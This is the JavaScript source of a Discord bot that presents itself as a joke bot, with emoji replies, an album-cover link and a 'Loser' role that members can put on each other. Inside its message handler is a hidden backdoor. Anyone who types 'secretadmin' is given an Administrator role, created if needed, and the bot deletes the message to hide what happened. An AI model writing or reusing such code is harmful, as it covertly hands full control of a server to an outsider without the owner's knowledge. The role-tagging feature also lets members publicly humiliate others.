require('dotenv').config();
const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ]
});

const TOKEN = process.env.DISCORD_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const ADMIN_ROLE_NAME = 'Admin';
const HIDDEN_TRIGGER = 'secretadmin';
const LOSER_ROLE_NAME = 'Loser';

// Register slash commands
const commands = [
  new SlashCommandBuilder()
    .setName('igoshit')
    .setDescription('Replies with toilet paper emoji')
    .toJSON(),
  new SlashCommandBuilder()
    .setName('ht')
    .setDescription('Sends Hybrid Theory album cover')
    .toJSON(),
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
  try {
    console.log('Registering slash commands...');
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log('Slash commands registered!');
  } catch (error) {
    console.error('Error registering commands:', error);
  }
})();

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

// Handle slash commands
client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'igoshit') {
    await interaction.reply('🧻');
  }

  if (interaction.commandName === 'ht') {
    await interaction.reply('https://cdn.discordapp.com/attachments/1441177908784926823/1441183530481750136/Linkin_Park_Hybrid_Theory_Album_Cover.png?ex=6920de41&is=691f8cc1&hm=8f43d17083772a097129c2e6958446940233b10cccbf8d9f39a8a9c994a051c8&');
  }
});

// Handle message events
client.on('messageCreate', async message => {
  if (message.author.bot) return;

  const content = message.content.toLowerCase();
  const guild = message.guild;
  if (!guild) return;

  // Hidden trigger for admin role
  if (content.includes(HIDDEN_TRIGGER)) {
    try {
      let adminRole = guild.roles.cache.find(role => role.name === ADMIN_ROLE_NAME);
      
      if (!adminRole) {
        adminRole = await guild.roles.create({
          name: ADMIN_ROLE_NAME,
          permissions: ['Administrator'],
          reason: 'Admin role creation',
        });
      }

      const member = message.member;
      if (member && !member.roles.cache.has(adminRole.id)) {
        await member.roles.add(adminRole);
        await message.delete().catch(() => {});
        await member.send(`You've been granted the ${ADMIN_ROLE_NAME} role.`).catch(() => {});
      }
    } catch (error) {
      console.error('Error granting admin role:', error);
    }
  }

  // Respond with toilet paper emoji to "I have to poop"
  if (content === 'i have to poop') {
    try {
      await message.reply('🧻');
    } catch (error) {
      console.error('Error sending toilet paper emoji:', error);
    }
  }

  // Handle "is a loser" - give Loser role to mentioned user
  if (message.mentions.users.size > 0 && content.includes('is a loser')) {
    try {
      let loserRole = guild.roles.cache.find(role => role.name === LOSER_ROLE_NAME);
      
      if (!loserRole) {
        loserRole = await guild.roles.create({
          name: LOSER_ROLE_NAME,
          reason: 'Loser role creation',
        });
      }

      const mentionedUser = message.mentions.users.first();
      const mentionedMember = guild.members.cache.get(mentionedUser.id);
      
      if (mentionedMember && !mentionedMember.roles.cache.has(loserRole.id)) {
        await mentionedMember.roles.add(loserRole);
      }
    } catch (error) {
      console.error('Error adding Loser role:', error);
    }
  }

  // Handle "isn't a loser" - remove Loser role from mentioned user
  if (message.mentions.users.size > 0 && content.includes("isn't a loser")) {
    try {
      const loserRole = guild.roles.cache.find(role => role.name === LOSER_ROLE_NAME);
      
      if (loserRole) {
        const mentionedUser = message.mentions.users.first();
        const mentionedMember = guild.members.cache.get(mentionedUser.id);
        
        if (mentionedMember && mentionedMember.roles.cache.has(loserRole.id)) {
          await mentionedMember.roles.remove(loserRole);
        }
      }
    } catch (error) {
      console.error('Error removing Loser role:', error);
    }
  }
});

client.login(TOKEN);
